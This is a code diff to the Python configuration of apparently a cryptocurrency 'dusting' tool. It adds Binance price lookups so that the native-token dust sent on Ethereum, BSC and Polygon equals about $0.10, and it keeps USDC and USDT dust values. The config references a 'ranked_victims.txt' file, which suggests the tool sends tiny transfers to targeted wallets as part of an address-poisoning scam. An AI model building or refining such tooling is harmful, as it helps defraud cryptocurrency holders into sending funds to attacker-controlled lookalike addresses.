@@ -1,17 +1,77 @@
 import os
 import os.path
+import time
+import urllib.request
+import json
 from dotenv import load_dotenv
 
 # PM2 Safety: Ensure .env does NOT overwrite OS-level variables injected by PM2
 load_dotenv(override=False)
 
-# --- NEW: Dynamic Unit Parsing Helper ---
+# --- Dynamic Unit Parsing Helper ---
 def parse_units(amount_str, decimals):
     """Converts a human-readable float string into atomic integer units."""
     return int(float(amount_str) * (10 ** decimals))
 
-# Read human-readable dust values from .env, with safe fallbacks
-env_dust_native = os.getenv("DUST_NATIVE", "0.0001")
+# ─── Native Dust USD Target Configuration ───
+# Target ~$0.10 USD equivalent for native dust across all chains
+NATIVE_DUST_USD_TARGET = float(os.getenv("NATIVE_DUST_USD_TARGET", "0.10"))
+
+# Cache for native prices to avoid repeated API calls and provide instant fallbacks
+_PRICE_CACHE = {}
+_CACHE_TTL = 3600  # 1 hour
+
+def get_native_price(symbol):
+    """Fetches native token price from Binance API with strict cache fallback."""
+    symbol_upper = symbol.upper()
+    if symbol_upper in ("ETH", "WETH"):
+        pair = "ETHUSDT"
+    elif symbol_upper in ("BNB", "WBNB"):
+        pair = "BNBUSDT"
+    elif symbol_upper in ("MATIC", "POL", "WMATIC"):
+        pair = "MATICUSDT"
+    else:
+        raise ValueError(f"Unknown native symbol for price fetch: {symbol}")
+        
+    cache_key = f"price_{pair}"
+    now = time.time()
+    
+    # 1. Check cache first (strict TTL)
+    if cache_key in _PRICE_CACHE:
+        price, timestamp = _PRICE_CACHE[cache_key]
+        if now - timestamp < _CACHE_TTL:
+            return price
+            
+    # 2. Fetch live price from Binance API
+    try:
+        url = f"https://api.binance.com/api/v3/ticker/price?symbol={pair}"
+        req = urllib.request.Request(url, headers={'User-Agent': 'CipherNet/1.0'})
+        with urllib.request.urlopen(req, timeout=5) as response:
+            data = json.loads(response.read().decode())
+            price = float(data['price'])
+            if price > 0:
+                _PRICE_CACHE[cache_key] = (price, now)
+                return price
+    except Exception as e:
+        print(f"[config] Warning: Failed to fetch live price for {pair}: {e}.")
+        
+    # 3. Strict Fallback: ONLY use the cached price (even if expired) if API fails
+    if cache_key in _PRICE_CACHE:
+        price, _ = _PRICE_CACHE[cache_key]
+        print(f"[config] ⚠️ API failed. Falling back to cached price for {pair}.")
+        return price
+        
+    # 4. If no cache exists and API failed, we cannot safely calculate the dust amount.
+    # We raise an error to prevent sending incorrect amounts based on guesses.
+    raise RuntimeError(f"CRITICAL: Failed to fetch price for {pair} and no cache exists. Cannot calculate native dust amount.")
+
+def calculate_native_dust(symbol, decimals):
+    """Calculates atomic native dust amount to equal the target USD value (~$0.10)."""
+    price = get_native_price(symbol)
+    native_amount = NATIVE_DUST_USD_TARGET / price
+    return int(native_amount * (10 ** decimals))
+
+# Read human-readable dust values for stablecoins from .env, with safe fallbacks
 env_dust_usdc = os.getenv("DUST_USDC", "0.0242")
 env_dust_usdt = os.getenv("DUST_USDT", "0.0242")
 
@@ -29,7 +89,7 @@ CHAINS = {
             "WBTC": "0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599",
         },
         "dust": {
-            "ETH": parse_units(env_dust_native, 18),
+            "ETH": calculate_native_dust("ETH", 18),
             "USDC": parse_units(env_dust_usdc, 6),
             "USDT": parse_units(env_dust_usdt, 6),
         },
@@ -53,7 +113,7 @@ CHAINS = {
             "BUSD": "0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56",
         },
         "dust": {
-            "BNB": parse_units(env_dust_native, 18),
+            "BNB": calculate_native_dust("BNB", 18),
             "USDC": parse_units(env_dust_usdc, 18), # BSC uses 18 decimals safely
             "USDT": parse_units(env_dust_usdt, 18),
         },
@@ -78,7 +138,7 @@ CHAINS = {
             "WBTC": "0x1bfd67037b42cf73acF2047067bd4F2C47D9BfD6",
         },
         "dust": {
-            "MATIC": parse_units(env_dust_native, 18),
+            "MATIC": calculate_native_dust("MATIC", 18),
             "USDC": parse_units(env_dust_usdc, 6),
             "USDT": parse_units(env_dust_usdt, 6),
         },
@@ -121,9 +181,12 @@ class Config:
         self.RANKED_ADDRESSES_FILE = append_chain_suffix(os.getenv("RANKED_ADDRESSES_FILE", "ranked_addresses.txt"))
         self.RANKED_DETAILS_FILE = append_chain_suffix(os.getenv("RANKED_DETAILS_FILE", "ranked_victims.txt"))
 
-        # --- Dust amounts (legacy fallback) ---
+        # --- Dust amounts (legacy fallback, dynamically calculated for native) ---
+        current_chain_cfg = CHAINS.get(CHAIN, CHAINS["ethereum"])
+        native_sym = current_chain_cfg["native_symbol"]
+        
         self.DUST_AMOUNT = {
-            "ETH": parse_units(env_dust_native, 18),
+            native_sym: calculate_native_dust(native_sym, 18),
             "USDC": parse_units(env_dust_usdc, 6),
             "USDT": parse_units(env_dust_usdt, 6),
         }
